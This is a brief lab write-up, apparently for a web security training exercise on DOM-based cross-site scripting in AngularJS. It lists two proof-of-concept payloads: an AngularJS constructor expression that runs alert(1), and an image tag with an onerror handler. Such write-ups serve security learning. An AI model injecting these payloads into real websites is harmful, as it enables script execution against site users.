Lab #11 - DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

Target Goal - Exploit the DOM XSS vulnerability to call the alert function.

Analysis:


{{$on.constructor('alert(1)')()}}


test"<img src=1 onerror=alert(1)>